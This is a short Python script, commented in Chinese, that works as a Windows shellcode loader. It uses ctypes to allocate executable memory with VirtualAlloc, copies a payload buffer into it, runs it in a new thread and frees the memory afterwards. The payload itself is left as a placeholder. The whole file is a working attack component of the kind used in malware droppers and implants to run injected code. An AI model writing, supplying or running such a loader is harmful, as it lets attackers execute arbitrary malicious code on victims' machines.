import ctypes


def execute_payload(shellcode):
    # 申请内存属于64位
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

    # 申请一块内存空间
    rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)

    # 往内存空间里写入shellcode
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode),
                                         len(shellcode))

    # 创建线程
    handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)

    # 轮询等待线程结束
    STILL_ACTIVE = 259
    while True:
        exit_code = ctypes.c_ulong()
        if ctypes.windll.kernel32.GetExitCodeThread(handle, ctypes.byref(exit_code)):
            if exit_code.value == STILL_ACTIVE:
                continue
            else:
                break

    # 释放内存
    ctypes.windll.kernel32.VirtualFree(ctypes.c_uint64(rwxpage), 0, 0x8000)


buf = b'...'
execute_payload(buf)
